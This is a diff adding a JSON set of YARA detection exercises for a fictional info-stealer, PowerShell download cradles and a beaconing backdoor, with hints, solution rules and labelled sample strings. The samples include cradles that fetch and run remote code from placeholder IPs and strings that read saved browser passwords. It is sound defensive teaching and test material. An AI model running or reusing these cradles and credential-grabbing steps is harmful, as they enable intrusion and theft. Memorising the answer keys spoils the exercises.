@@ -1,0 +1,114 @@
+{
+  "rounds": [
+    {
+      "title": "Find what makes it unique",
+      "brief": "Three samples of a made-up info-stealer called Inkwell were pulled off infected laptops. Two clean programs sit in the same folder. Write a rule that flags all three Inkwell samples and neither clean file.",
+      "hint": "Look for a string that appears in every Inkwell sample and in nothing else. Malware often creates a mutex (a named lock) so it only runs once per machine, and that name rarely changes.",
+      "starter": "rule Inkwell_Stealer\n{\n  strings:\n    $a = \"Inkwell\"\n  condition:\n    any of them\n}",
+      "solution": "rule Inkwell_Stealer\n{\n  strings:\n    $mutex = \"InkwellMtx\"\n  condition:\n    any of them\n}",
+      "explain": "The family name alone also hits the notes app (it ships a font called Inkwell Sans), and /gate.php hits the parking app. A mutex name starting Global\\InkwellMtx_ is specific to the malware's own code, so it catches every sample without touching clean files. Good rules hunt for strings that only the bad thing would contain.",
+      "samples": [
+        {
+          "name": "inkwell_a.exe",
+          "malicious": true,
+          "text": "!This program cannot be run in DOS mode.\n.text\n.rdata\nkernel32.dll\nCreateMutexW\nGlobal\\InkwellMtx_{n4}\n\\Google\\Chrome\\User Data\\Default\\Login Data\nSELECT origin_url, username_value, password_value FROM logins\nPOST /gate.php HTTP/1.1\nHost: cdn-update.example"
+        },
+        {
+          "name": "inkwell_b.exe",
+          "malicious": true,
+          "text": "!This program cannot be run in DOS mode.\n.text\n.data\nadvapi32.dll\nCreateMutexW\nGlobal\\InkwellMtx_{n4}\n\\Mozilla\\Firefox\\Profiles\\\nlogins.json\nkey4.db\nPOST /gate.php HTTP/1.1\nHost: img-cache.example"
+        },
+        {
+          "name": "invoice_viewer.exe",
+          "malicious": true,
+          "text": "!This program cannot be run in DOS mode.\nUPX0\nUPX1\nLoadLibraryA\nGetProcAddress\nGlobal\\InkwellMtx_{n4}\nwallet.dat\nInvoice Viewer 2.1"
+        },
+        {
+          "name": "inkpad_setup.exe",
+          "malicious": false,
+          "text": "!This program cannot be run in DOS mode.\n.text\n.rsrc\nuser32.dll\nInkPad Notes Setup\nInstalling font: Inkwell Sans\nSoftware\\InkPad\\Settings\nhttps://inkpad.example/release-notes"
+        },
+        {
+          "name": "parkpass.exe",
+          "malicious": false,
+          "text": "!This program cannot be run in DOS mode.\n.text\nws2_32.dll\nParkPass gate controller\nPOST /gate.php HTTP/1.1\nHost: parking.example\nBarrier open request sent"
+        }
+      ]
+    },
+    {
+      "title": "Combine weak signals",
+      "brief": "PowerShell download cradles fetch code from the internet and run it straight from memory. Admins use PowerShell all the time too. Flag the three cradles and none of the three admin scripts.",
+      "hint": "No single string works on its own. A cradle does two things: download text (DownloadString) and execute it (IEX or Invoke-Expression). Use and in the condition. Attackers mix upper and lower case, so try a regex with /i or a text string with nocase.",
+      "starter": "rule PowerShell_Download_Cradle\n{\n  strings:\n    $a = \"powershell\" nocase\n  condition:\n    any of them\n}",
+      "solution": "rule PowerShell_Download_Cradle\n{\n  strings:\n    $download = \"downloadstring\" nocase\n    $execute = /\\b(iex|invoke-expression)\\b/i\n  condition:\n    $download and $execute\n}",
+      "explain": "Each piece alone is common: admins download files, run hidden windows and even write about Invoke-Expression. Downloading text and executing it in the same script is the behaviour that matters. Real detections work the same way: several weak signals that together are strong.",
+      "samples": [
+        {
+          "name": "dropper.ps1",
+          "malicious": true,
+          "text": "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')\""
+        },
+        {
+          "name": "update_helper.ps1",
+          "malicious": true,
+          "text": "$u = 'http://files.example/stage2.txt'\n$wc = New-Object System.Net.WebClient\nInvoke-Expression ($wc.DownloadString($u))"
+        },
+        {
+          "name": "run.bat",
+          "malicious": true,
+          "text": "@echo off\npowershell.exe -NoProfile -WindowStyle Hidden -Command \"iex(new-object net.webclient).downloadstring('http://203.0.113.9/p')\""
+        },
+        {
+          "name": "nightly_backup.ps1",
+          "malicious": false,
+          "text": "# Runs the backup without popping up a window\nStart-Process powershell -WindowStyle Hidden -ArgumentList '-File C:\\Scripts\\nightly-backup.ps1'"
+        },
+        {
+          "name": "get_drivers.ps1",
+          "malicious": false,
+          "text": "$wc = New-Object System.Net.WebClient\n$wc.DownloadFile('https://downloads.example/driver.zip', 'C:\\Temp\\driver.zip')\nExpand-Archive C:\\Temp\\driver.zip C:\\Drivers"
+        },
+        {
+          "name": "style_guide.txt",
+          "malicious": false,
+          "text": "PowerShell style guide\n- Never use Invoke-Expression on text you did not write.\n- Prefer Invoke-WebRequest -OutFile over piping downloads.\n- Sign every script before it goes to production."
+        }
+      ]
+    },
+    {
+      "title": "Patterns, not lists",
+      "brief": "A backdoor beacons to a new random subdomain every time it's built, so a list of domains is out of date by tomorrow. The vendor it imitates has a real health-check service on the same domain. Catch all three beacons, but not the health check or the docs.",
+      "hint": "The random part is always six lowercase letters or digits, followed by .cdn-sync.example/b/ping. A regex like /[a-z0-9]{6}\\.cdn-sync\\.example/ is a start, but “health” is six letters too. Add a second string for the real service and use not.",
+      "starter": "rule Backdoor_Beacon\n{\n  strings:\n    $a = \"cdn-sync.example\"\n  condition:\n    any of them\n}",
+      "solution": "rule Backdoor_Beacon\n{\n  strings:\n    $beacon = /[a-z0-9]{6}\\.cdn-sync\\.example\\/b\\/ping/\n    $real = \"health.cdn-sync.example\"\n  condition:\n    $beacon and not $real\n}",
+      "explain": "A regex describes the shape of the indicator instead of listing every value, so it keeps working on builds you haven't seen yet. The not clause carves out a known-good lookalike. Exclusions like this are common in real rules, and worth a comment explaining why they're there.",
+      "samples": [
+        {
+          "name": "svc_host32.exe",
+          "malicious": true,
+          "text": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nhttps://{r6}.cdn-sync.example/b/ping\nsleep=60000\njitter=20"
+        },
+        {
+          "name": "msupdate.dll",
+          "malicious": true,
+          "text": "rundll32.exe\nhttps://{r6}.cdn-sync.example/b/ping\nsleep=45000\njitter=10"
+        },
+        {
+          "name": "printer_drv.exe",
+          "malicious": true,
+          "text": "SpoolerHelper\nhttps://{r6}.cdn-sync.example/b/ping\nsleep=90000"
+        },
+        {
+          "name": "cdnsync_agent.exe",
+          "malicious": false,
+          "text": "CDN Sync Agent 4.2\nhttps://health.cdn-sync.example/b/ping\nHealth check every 5 minutes"
+        },
+        {
+          "name": "readme.html",
+          "malicious": false,
+          "text": "<h1>CDN Sync documentation</h1>\n<a href=\"https://www.cdn-sync.example/docs\">Read the docs</a>\n<p>Status page: https://status.cdn-sync.example/</p>"
+        }
+      ]
+    }
+  ]
+}
